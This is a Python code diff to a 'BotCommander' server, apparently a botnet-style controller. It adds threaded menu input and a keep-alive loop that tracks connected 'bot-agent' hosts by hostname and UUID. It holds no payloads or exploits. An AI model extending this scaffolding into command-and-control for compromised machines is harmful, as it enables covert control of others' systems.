@@ -1,5 +1,6 @@
 import os
 import asyncio
+from threading import Thread
 from pathlib import Path
 import configparser
 from logger import CoreLogger
@@ -33,6 +34,7 @@ class BotCommander:
         self.port = port
         self.conn_rcv = conn_rcv
         self.sock = socket(AF_INET, SOCK_STREAM)
+        self.user_thread = Thread(target=self.__get_user_input).start()
         asyncio.run(self.__run())
 
     @staticmethod
@@ -46,41 +48,68 @@ class BotCommander:
         ''')
 
     def __get_user_input(self):
-        val = 0
-        cmd = input("Please insert a digit representing the option you want to choose: ")
-        try:
-            val = int(cmd)
-        except ValueError:
-            print("You have not inserted a digit, please insert a digit.")
-            self.__get_user_input()
-        except Exception as err:
-            print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit. This"
-                  f"is the error: {err}")
-            self.__get_user_input()
-        if val in range(1, 4):
-            return val
-        else:
-            print("Please insert a digit corresponding to one of the available options, 1, 2 or 3")
-
-    async def __send_instructions(self, reader, writer):
         self.__print_help()
-        choice = self.__get_user_input()
-        message = "Hello"
-        addr = writer.get_extra_info('peername')
-        logger.core.debug(f"Sending data {message} to peer {addr}")
-        writer.write(message.encode("utf-8"))
+        while True:
+            val = 0
+            cmd = input("Please insert a digit representing the option you want to choose: ")
+            try:
+                val = int(cmd)
+            except ValueError:
+                print("You have not inserted a digit, please insert a digit.")
+            except Exception as err:
+                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
+                      f" This is the error: {err}")
+            if val in range(1, 4):
+                return val
+            else:
+                print("Please insert a digit corresponding to one of the available options, 1, 2 or 3")
 
-        data = await reader.read(self.conn_rcv)
-        message = data.decode("utf-8")
-        logger.core.debug(f"Received {message} from {addr}")
-
-        writer.close()
+    async def __proces_keep_alive(self, reader, writer, addr, hostname, uuid):
+        while True:
+            try:
+                data = await reader.read(self.conn_rcv)
+            except Exception as err:
+                logger.core.error(f"Unexpected exception when reading keep-alive hello from peer {hostname}: {err},"
+                                  f" closing connection")
+                writer.close()
+                return
+            if data:
+                try:
+                    msg = data.decode("utf-8")
+                    if msg == "Hello":
+                        logger.core.debug(f"Received Hello from bot-agent {hostname}:{addr}")
+                        self.uuids[uuid] = (hostname, True)
+                        logger.core.info(f"Bot-agent {hostname}:{addr} is still online")
+                        try:
+                            logger.core.debug(f"Sending HelloReply to bot-agent {hostname}:{addr}")
+                            writer.write(b"HelloReply")
+                        except Exception as err:
+                            logger.core.error(f"Unexpected exception when sending HelloReply to {hostname}: {err},"
+                                              f" closing connection")
+                            writer.close()
+                            return
+                    else:
+                        logger.core.error(f"Unknown message received from peer {hostname}:{addr}, expecting Hello."
+                                          f" Closing connection")
+                        writer.close()
+                        return
+                except Exception as err:
+                    logger.core.error(f"Unexpected error while decoding data from peer {hostname}:{addr}. Expecting"
+                                      f"hello for keep-alive: {err}")
+                    writer.close()
+                    return
+            else:
+                logger.core.error(f"EOF received when waiting for keep-alive hello from bot-agent {hostname}:{addr},"
+                                  f" closing connection")
+                writer.close()
+                return
 
     async def __identify_agent(self, reader, writer):
         addr = writer.get_extra_info('peername')
         logger.core.info(f"Connection accepted from peer {addr}")
         hostname = await self.__get_hostname(reader, writer, addr)
-        await self.__process_uuid(reader, writer, addr, hostname)
+        uuid = await self.__process_uuid(reader, writer, addr, hostname)
+        asyncio.create_task(self.__proces_keep_alive(reader, writer, addr, hostname, uuid))
 
     async def __process_uuid(self, reader, writer, addr, hostname):
         try:
@@ -109,6 +138,7 @@ class BotCommander:
                               f" closing connection")
             writer.close()
             return
+        return uuid
 
     @staticmethod
     def __get_uuid_payload():
